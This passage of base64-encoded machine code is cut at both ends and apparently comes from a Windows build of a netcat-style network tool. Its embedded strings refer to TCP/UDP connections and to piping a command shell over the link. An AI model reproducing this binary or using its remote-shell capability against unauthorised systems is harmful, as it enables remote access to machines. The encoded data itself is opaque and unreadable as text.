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MDEyMzQ1Njc4OWFiY2RlZiAgAAD/////AEAAALBiQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbGliZ2NqLTExLmRsbABfSnZfUmVnaXN0ZXJDbGFzc2VzAAAAUE9TSVhMWV9DT1JSRUNUAC0tACVzOiBvcHRpb24gYCVzJyBpcyBhbWJpZ3VvdXMKAAAAACVzOiBvcHRpb24gYC0tJXMnIGRvZXNuJ3QgYWxsb3cgYW4gYXJndW1lbnQKAAAAACVzOiBvcHRpb24gYCVjJXMnIGRvZXNuJ3QgYWxsb3cgYW4gYXJndW1lbnQKAAAAACVzOiBvcHRpb24gYCVzJyByZXF1aXJlcyBhbiBhcmd1bWVudAoAAAAlczogdW5yZWNvZ25pemVkIG9wdGlvbiBgLS0lcycKACVzOiB1bnJlY29nbml6ZWQgb3B0aW9uIGAlYyVzJwoAACVzOiBpbGxlZ2FsIG9wdGlvbiAtLSAlYwoAJXM6IGludmFsaWQgb3B0aW9uIC0tICVjCgAAAAAlczogb3B0aW9uIHJlcXVpcmVzIGFuIGFyZ3VtZW50IC0tICVjCgAARmFpbGVkIHRvIGNyZWF0ZSBzaGVsbCBzdGRvdXQgcGlwZSwgZXJyb3IgPSAlcwAARmFpbGVkIHRvIGNyZWF0ZSBzaGVsbCBzdGRpbiBwaXBlLCBlcnJvciA9ICVzAEZhaWxlZCB0byBleGVjdXRlIHNoZWxsAAAARmFpbGVkIHRvIGNyZWF0ZSBSZWFkU2hlbGwgc2Vzc2lvbiB0aHJlYWQsIGVycm9yID0gJXMAAABXYWl0Rm9yTXVsdGlwbGVPYmplY3RzIGVycm9yOiAlcwAAAABGYWlsZWQgdG8gZXhlY3V0ZSBzaGVsbCwgZXJyb3IgPSAlcwBTZXNzaW9uUmVhZFNoZWxsVGhyZWFkRm4gZXhpdHRlZCwgZXJyb3IgPSAlcwBleGl0D